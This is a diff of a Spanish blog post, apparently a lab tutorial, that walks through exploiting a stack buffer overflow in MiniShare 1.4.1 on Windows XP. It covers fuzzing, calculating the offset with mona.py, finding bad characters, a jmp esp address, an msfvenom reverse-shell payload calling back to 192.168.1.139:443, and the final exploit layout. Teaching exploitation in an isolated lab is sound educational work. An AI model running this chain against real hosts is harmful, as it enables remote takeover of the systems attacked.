@@ -1,7 +1,7 @@
 ---
 title: "Stack-Buffer Overflow [Windows x86] (Part II)"
 layout: single
-excerpt: "Esta es la segunda parte"
+excerpt: "En este artículo, exploramos un exploit que sigue un flujo específico para obtener una shell remota. El proceso incluye la generación de bytes, un salto a la dirección de memoria ESP y la ejecución de un shellcode. A través de pasos detallados y el uso de herramientas como mona.py y msfvenom, demostramos cómo aprovechar una vulnerabilidad y lograr el objetivo deseado."
 header:
 show_date: true
 classes: wide
@@ -19,15 +19,15 @@ tags:
 ---
 ![BUFFER](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/67f7e313-8807-4af1-abd3-2e53f6b4ec24)
 
-El 20 de febrero de 2022 publique mi primer articulo sobre como abordar una explotación de *Buffer overflow* de manera exitosa, además de comprender los conceptos básicos para su desempeño en sistemas operativos GNU/Linux. 
+El 20 de febrero de 2022 publiqué mi primer artículo sobre cómo abordar una explotación de Buffer Overflow de manera exitosa, además de comprender los conceptos básicos para su desempeño en sistemas operativos GNU/Linux.
 
-Hoy traigo la parte dos de esta saga. En este articulo explicare de manera detallada la explotación de BoF en sistemas operativos Windows de 32 bits.
+Hoy traigo la parte dos de esta saga. En este artículo explicaré de manera detallada la explotación de BoF en sistemas operativos Windows de 32 bits.
 
-Llevaremos a cabo nuestras pruebas utilizando el software Minishare, concretamente la version 1.4.1.  Este programa actúa como servidor HTTP simple para intercambiar archivos de manera sencilla y eficaz entre múltiples usuarios en Red. 
+Llevaremos a cabo nuestras pruebas utilizando el software Minishare, concretamente la versión 1.4.1. Este programa actúa como servidor HTTP simple para intercambiar archivos de manera sencilla y eficaz entre múltiples usuarios en red.
 
-Este software permite a atacantes obtener ejecución remota de comandos a través de una consulta HTTP malintencionada via GET, POST o incluso HEAD. Este problema surge debido a una verificación incorrecta del *input* del usuario.
+Este software permite a los atacantes obtener ejecución remota de comandos a través de una consulta HTTP malintencionada vía GET, POST o incluso HEAD. Este problema surge debido a una verificación incorrecta del input del usuario.
 
-En el laboratorio de hoy aprovecharemos esta vulnerabilidad para ganar acceso a la maquina victima a través de una petición GET preparada.
+En el laboratorio de hoy aprovecharemos esta vulnerabilidad para ganar acceso a la máquina víctima a través de una petición GET preparada.
 
 Material necesario:
 - Windows XP (32 bits) [Victima]
@@ -37,9 +37,9 @@ Material necesario:
 	- mona.py 
 - Python2 / Python3
 
-Para esta prueba de concepto no tendremos activado ASLR (Aleatorización en las direcciones de memoria) y del mismo modo tampoco tendremos DEP (Prevención de ejecución de datos). 
+Para esta prueba de concepto, no tendremos activado ASLR (Address Space Layout Randomization), y de la misma manera, tampoco tendremos DEP (Data Execution Prevention).
 
-Una vez con todo los requisitos preparados comenzaremos iniciando Immunity debugger y posteriormente Minishare en nuestro Windows XP, seguidamente pulsaremos CTRL + F1 para vincularnos con Minishare.
+Una vez que tengamos todos los requisitos preparados, comenzaremos iniciando Immunity Debugger y posteriormente Minishare en nuestro Windows XP. Luego, pulsaremos CTRL + F1 para vincularnos con este.
 
 ![2](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/7f0aad41-8f65-4132-9055-caf23359a755)
 
@@ -51,9 +51,10 @@ Este es el aspecto resultante (4 ventanas):
 
 ![3](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/189a402e-d636-4c7f-bc1f-10f9259756e7)
 
-En este punto ya podemos comenzar a trabajar. El primer paso será crear un *fuzzer* para determinar el numero de Bytes a enviar antes de que el programa corrompa.
+En este punto, ya podemos comenzar a trabajar. El primer paso será crear un "fuzzer" para determinar el número de bytes a enviar antes de que el programa se corrompa.
 
-Para ello me he creado un pequeño script en Python3:
+Para ello, he creado un pequeño script en Python 3:
+
 ```python
 #!/usr/bin/python3
 
@@ -100,9 +101,9 @@ if __name__ == '__main__':
     main()
 ```
 
-Este script enviara 100 caracteres A representados en HEX `\x41` cada x tiempo hasta dar con el numero maximo de Bytes en el que el programa corrompe.
+Este script enviará 100 caracteres 'A' representados en hexadecimal como `\x41` cada cierto intervalo de tiempo hasta encontrar el número máximo de bytes en el que el programa se corrompa.
 
-Podemos ver mejor el funcionamiento de este script si solo enviamos 100 bytes e imprimimos el resultado.
+Podemos comprender mejor el funcionamiento de este script si enviamos solo 100 bytes e imprimimos el resultado.
 
 ```python
 #!/usr/bin/python3
@@ -141,20 +142,19 @@ Resultado:
 
 ![4](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/938501f7-7663-49d8-8ca3-c861e1c08e0a)
 
-Con el bucle infinito estariamos enviando 100 bytes constantemente hasta que se genere la exepcion y por consecuente que el programa corrompa.
+Con el bucle infinito, estaremos enviando constantemente 100 bytes hasta que se genere una excepción y, por consiguiente, el programa se corrompa.
 
-A continuación un video de su funcionamiento:
+A continuación, adjunto un video que muestra el funcionamiento del script:
 
-<video src="https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/0ddf0518-21cb-4227-9294-2a6408873e5f" controls="controls" style="max-width: 730px;"></video>
+<video src="https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/0ddf0518-21cb-4227-9294-2a6408873e5f" controls="controls" style="max-width: 1000px;"></video>
 
-
-Segun el *fuzzer*, el programa corrompe entre 1700 y 1800 Bytes, pero esto no nos sirve, debemos conocer el numero de bytes exactos antes de sobreescribir el registro EIP. Para ello podemos generar una cadena preparada para determinar este numero. Esto lo podemos hacer con una utilidad llamada mona.py.
+Según el *fuzzer*, el programa se corrompe entre 1700 y 1800 bytes. Sin embargo, necesitamos conocer el número exacto de bytes antes de sobrescribir el registro EIP. Para lograr esto, podemos generar una cadena preparada utilizando una utilidad llamada mona.py.
 
 ![image](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/89bbba8e-b093-4cfa-b08e-f6840fd6b3e1)
 
 > **Nota:** 1800 -> N° de Bytes en que corrompe el programa
 
-No es recomendable copiar directamente la cadena, una mejor manera de hacerlo es mediante el archivo `txt` que nos genera en `C:\Program Files\Immunity Inc\Immunity Debugger`.
+Es importante tener en cuenta que no es recomendable copiar directamente la cadena preparada. Existe una mejor manera de obtenerla y es mediante el archivo `.txt` generado por **Immunity Debugger** en la siguiente ruta: `C:\Program Files\Immunity Inc\Immunity Debugger`.
 
 ![7](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/945997f0-926b-455a-b243-132f511900cc)
 
@@ -162,9 +162,9 @@ Lo abrimos y copiamos el ASCII.
 
 ![8](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/21e32387-8212-4c0e-85f6-fa98c241ab24)
 
-Una vez tenemos esta cadena ya podremos calcular de manera exacta el offset. 
+Una vez que tengamos esta cadena, podremos calcular de manera exacta el desplazamiento (offset).
 
-Con la misma base de antes he creado este script en Python3:
+Con la base que hemos utilizado anteriormente, he creado este script en Python 3:
 
 ```python
 #!/usr/bin/python3
@@ -205,35 +205,36 @@ if __name__ == '__main__':
     main()
 ```
 
-Este script simplemente se conecta al servidor y envia la cadena preparada que contiene 1800 Bytes.
+Este script simplemente se conecta al servidor y envía la cadena preparada que contiene 1800 bytes.
 
-Entonces como es de esperar cuando se envian 1800 Bytes el programa corrompe:
+Como es de esperar, cuando se envían esos 1800 bytes, el programa se corrompe.
 
 ![9](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/808d44d0-727c-49a4-8911-76123f05a45f)
 
-En este punto simplemente debemos copiar la direccion que se queda en EIP despues de que corrompa el programa.
-Ahora podemos usar mona.py para calcular el numero de bytes necesarios antes de sobreescribir EIP.
+En este punto, simplemente debemos tomar nota de la dirección que se muestra en el registro EIP después de que el programa se corrompa.
+
+Ahora, podemos utilizar la herramienta mona.py para calcular el número exacto de bytes necesarios antes de sobrescribir el registro EIP.
 
 ![10](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/54d1039c-feee-469a-8b73-ed4681f32085)
 
-Perfecto!, 1787 Bytes son los que hacen falta antes de sobreescribir EIP. 
+¡Excelente! Entonces, necesitamos un total de 1787 bytes antes de sobrescribir el registro EIP.
 
-En este punto es importante tener en cuenta un concepto. Hay ciertos de caracteres que son "malos" o invalidos y nos pueden ocasionar problemas a la hora de representar el `shellcode`, estos caracteres son los siguientes:
+En este punto, es importante tener en cuenta un concepto clave. Existen ciertos caracteres que son considerados "malos" o inválidos y pueden causarnos problemas al representar el `shellcode`. Estos caracteres son los siguientes:
 
-- `\x00` Byte nulo
-- `\x0A` Salto de linea
-- `\x0D` Retorno de carro
-- `\xFF` Salto de formato
+- `\x00`: Byte nulo.
+- `\x0A`: Salto de línea (line feed).
+- `\x0D`: Retorno de carro (carriage return).
+- `\xFF`: Salto de formato (format string).
 
 > **Nota:** Los mas comúnes suelen ser `\x00` y `\x0D`.
 
-Podemos detectarlos utilizando una funcionalidad de mona.py para generar una cadena de todos los posibles bytes. 
+Podemos detectarlos utilizando una funcionalidad de `mona.py` llamada `bytearray` que nos permite generar una cadena con todos los posibles bytes.
 
 ![image](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/ac089a3e-c923-44dc-9947-2d0aa9e2b7f8)
 
-De igual manera que antes podemos copiarla desde el archivo `txt` que nos genera en `C:\Program Files\Immunity Inc\Immunity Debugger`.
+De igual manera que antes, podemos copiar la cadena preparada desde el archivo txt que se genera en C:\Program Files\Immunity Inc\Immunity Debugger.
 
-Entonces vamos a hacer una prueba, para lo cual he creado otro pequeño script en python3 para abordar esta situacion:
+Ahora, vamos a realizar una prueba utilizando esta cadena. Para ello, he creado otro pequeño script en Python 3 que abordará esta situación. Aquí tienes el código:
 
 ```python
 #!/usr/bin/python3
@@ -260,19 +261,19 @@ sock.recv(1024)
 sock.close()
 ```
 
-Este script envía una secuencia de 1787 caracteres "A" seguido de 4 caracteres "B", 400 caracteres "C" y la cadena generada por mona.py.
-Una vez ejecutado el script podemos apreciar como EIP corresponde a 4 Bytes de `\x42` , que a su vez es el caracter "B" en HEX.
+Este script envía una secuencia de 1787 caracteres 'A' seguidos de 4 caracteres 'B', 400 caracteres 'C' y, finalmente, la cadena generada por mona.py. Una vez ejecutado el script, podemos observar que el valor del registro EIP corresponde a 4 bytes representados por \x42, que en hexadecimal es el caracter 'B'.
 
 ![11](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/2b21eadb-7e4a-40cf-bd98-89ede9c32634)
 
-Hasta aqui todo bien, pero si miramos el volcado del registro ESP haciendo *Follow in Dump* sobre el mismo.
+Hasta aquí todo bien. Si observamos el volcado del registro ESP utilizando la función "Follow in Dump", podremos ver la representación de los bytes almacenados en esa área de memoria.
+
 ![followindump](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/3c34c5e6-ec5d-4a64-9733-aceced8da33e)
 
-> **Nota:** Nos interesa ESP porque es donde se encuentran todos los bytes generados por mona.py
+> **Nota:** Nos interesa el registro ESP porque es donde se encuentran almacenados todos los bytes generados por mona.py.
 
 ![badchars](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/53598358-c26c-408b-b6b7-90fd02aaa9d4)
 
-Como podemos apreciar No nos representa todos los bytes, esto se debe a que hay algunos que son invalidos, para solucionar esto simplemente hay que eliminar los que no consigue representar. En este caso no podemos apreciar `\x0b` por lo que debemos eliminarlo de nuestro script y volver a ejecutarlo.
+Como podemos apreciar, no se representan todos los *bytes* correctamente debido a que algunos son inválidos. Para solucionar este problema, simplemente debemos eliminar los *bytes* que no se pueden representar adecuadamente. En este caso, el byte `\x0B` no se muestra correctamente en el volcado del registro ESP, por lo tanto, debemos eliminarlo de nuestro script y volver a ejecutarlo para obtener una representación precisa de la cadena.
 
 ![image](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/e2088276-b82f-46e1-8bd3-ab1f76fa01f5)
 
@@ -280,15 +281,15 @@ De la misma manera no vemos `\x0d`, por lo que debemos eliminarlo, vamos a proba
 
 ![0d](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/95fd10bb-4130-473e-8723-43fe6297f706)
 
-Muy bien!, ahora ya nos logra representar todos los bytes sin problema, los badchars encontrados fueron eliminados.
+Muy bien, ahora logramos representar todos los bytes sin problemas, eliminando los caracteres inválidos encontrados.
 
-El siguiente paso es buscar una direccion que salte a ESP, ya que ahí es donde estara ubicado nuestro `shellcode`, para ello podemos usar mona.py.
+El siguiente paso consiste en buscar una dirección que realice un salto (`jmp`) a la ubicación del registro ESP, ya que allí es donde se encuentra nuestro `shellcode`. Para realizar esta búsqueda, podemos utilizar `mona.py`.
 
 ![image](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/cb296113-9e78-4342-a6d8-3b483b8a4731)
 
 > **Nota:** Es importante mencionar que debemos elegir una direccion de las DLL's que este en system32
 
-Ya casi hemos acabado, ahora debemos generar un `shellcode` que nos permita ganar una shell, para ello podemos crearlo usando `msfvenom`.
+¡Genial! Estamos llegando al final del proceso. Debemos generar un shellcode que nos permita obtener una shell, podemos utilizar la herramienta `msfvenom` de Metasploit Framework.
 
 ```bash
 -/$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.139 lport=443 -b "\x00\x0d" -f python
@@ -334,7 +335,7 @@ buf += b"\x50\x8b\x46"
 ```
 > **Nota:** Imporante incluir los *badchars* encontrados anteriormente para evitarlos en el `shellcode`
 
-Ya tenemos el `shellcode`. Solo nos falta crear el *exploit*:
+Perfecto, ahora que tenemos el shellcode, el siguiente paso es crear el `exploit` que utilizará ese shellcode para explotar la vulnerabilidad y obtener una shell remota.
 
 ```python
 #!/usr/bin/python3
@@ -420,13 +421,16 @@ Este exploit seguira el siguiente flujo.
 ```
 AAAAAAAAAA.... → \xeb\x30\x6b\7e → \x90\x90\x90\x90... → \xda\xda\xd9\x74\x24\xf4\x5b\x...
      ↥ 			↥                 ↥                             ↥
-   \x41               jmp esp            NOPS                         shellcode
+   \x41            jmp esp (EIP)         NOPS                       shellcode
 ```
-> **Importante:** Añadir NOPS para seguir correctamente el flujo del *exploit* y poner dirección de salto a ESP en *little endian*
 
-A continuación un video del *exploit* en ejecución:
+1. Comenzamos con una secuencia de caracteres "A" que llenará el *buffer*.
+2. A continuación, tenemos una instrucción `jmp esp` representada por los bytes `\xeb\x30\x6b\x7e`. Esta instrucción saltará a la dirección de memoria donde se encuentra el registro ESP, lo que nos permitirá redirigir la ejecución del programa a nuestro shellcode.
+4. Luego, utilizamos bytes \x90\x90\x90\x90 para representar una serie de instrucciones NOP (No Operation). Estas instrucciones no hacen nada y se utilizan para crear un espacio entre el salto y el shellcode, para asegurarnos de que la ejecución llegue al shellcode correctamente.
+5. Por último, tenemos el shellcode representado por los bytes \xda\xda\xd9\x74\x24\xf4\x5b\x.... El shellcode es el código que ejecutará nuestra acción deseada, en este caso, obtener una shell remota.
 
-<video src="https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/ad802ef5-06d7-49c8-a82c-f38f9558da12"></video>
+A continuación, adjunto un video que muestra el funcionamiento del *exploit*.
 
+<video src="https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/ad802ef5-06d7-49c8-a82c-f38f9558da12" controls="controls" style="max-width: 1000px;"></video>
 
 
